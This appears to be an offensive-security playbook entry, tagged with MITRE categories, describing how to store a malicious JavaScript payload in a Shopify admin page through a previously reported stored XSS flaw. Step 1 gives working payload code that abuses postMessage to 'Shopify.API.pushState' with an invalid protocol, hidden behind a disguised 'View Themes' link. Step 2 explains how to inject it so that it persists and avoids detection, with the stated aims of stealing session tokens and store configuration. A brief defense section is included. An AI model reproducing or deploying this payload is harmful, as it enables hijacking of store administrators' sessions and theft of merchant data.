---
tags:
  - xss
  - injection
  - shopify
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: f7eae497-5c6e-4dbd-a341-33fe3d958077
created_at: '2025-12-14T17:30:07.275Z'
updated_at: '2025-12-14T17:30:07.275Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Shopify-Admin-Page

## Summary

This procedure stores a malicious JavaScript payload in a Shopify admin-accessible page, exploiting a stored XSS vulnerability to set up subsequent execution for admin session abuse.

## Description

In the context of Shopify's admin panel, this procedure builds on a prior stored XSS vector (report #662083) to inject a script that defines an attack function and a clickable link. The payload targets improper filtering in the Shopify.API.pushState function, allowing invalid protocols to persist. Once stored, it enables DOM manipulation in an admin context, leading to data exfiltration such as session tokens and store configurations. Prerequisites include access to the injection point from the referenced report.

## Requirements

1. Valid Shopify admin account or equivalent access to storable fields
2. Knowledge of prior injection vector from report #662083
3. Browser with developer tools for payload crafting and verification

## Defense

Defensive measures and detection strategies:

- Implement strict Content Security Policy (CSP) to block inline JavaScript execution
- Sanitize and validate all user inputs, especially protocols in URL handling functions like pushState
- Monitor for anomalous postMessage events or unexpected window openings in admin sessions

## Objectives

1. Persist the XSS payload in an admin-viewable page
2. Avoid detection during storage by mimicking legitimate content
3. Prepare for trigger to open admin themes page

## Instructions

### Step 1: Prepare the Payload

**Context**: Craft the JavaScript payload that includes the attack function and a disguised clickable link to evade basic filters.

```javascript
function attack() {
  var win = window.open(location.origin + '/admin/themes', '_blank');
  window.attackSuccess = false;
  var interval = setInterval(function() {
    if (win.attackSuccess) {
      clearInterval(interval);
    } else {
      win.postMessage(JSON.stringify({message: 'Shopify.API.pushState', data: {pathname: 'invalid:pages/xss'}}), '*');
    }
  }, 100);
}
// Embed as: <script> above </script><a href="javascript:attack()">View Themes</a>
```

> This defines the function to open a window and set up postMessage interval. The link triggers it upon click. Test in a local environment to ensure no syntax errors.

### Step 2: Inject via Prior Vector

**Context**: Use the storage method from report #662083 to place the payload in an admin-accessible page, replacing the original step 02 script.

Navigate to the injection interface (e.g., a custom field or note section) and submit the payload as HTML/JS content.

> Expected: Payload saves without stripping the script tag or link. Verify by viewing the page source in the admin panel.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]
- [[shopify]]
